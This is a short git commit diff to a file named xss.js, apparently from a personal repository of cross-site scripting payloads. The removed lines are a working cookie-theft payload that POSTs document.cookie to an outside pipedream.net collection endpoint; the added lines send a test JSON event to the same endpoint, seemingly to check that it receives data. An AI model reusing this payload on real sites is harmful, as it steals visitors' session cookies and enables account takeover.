0e8a46286acc13165a83c26a059e7ff05a5f76b9
shiv0offical <102810150+shiv0offical@users.noreply.github.com>
2022-11-17 14:26:35 +0000

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,5 +1,15 @@
-fetch('https://eo1arll2f0cmi59.m.pipedream.net',{
-  method : 'POST',
-  mode : 'non-core',
-  body: document.cookie
-})
+const headers = new Headers()
+headers.append("Content-Type", "application/json")
+
+const body = {
+  "test": "event"
+}
+
+const options = {
+  method: "POST",
+  headers,
+  mode: "cors",
+  body: JSON.stringify(body),
+}
+
+fetch("https://eo1arll2f0cmi59.m.pipedream.net", options)
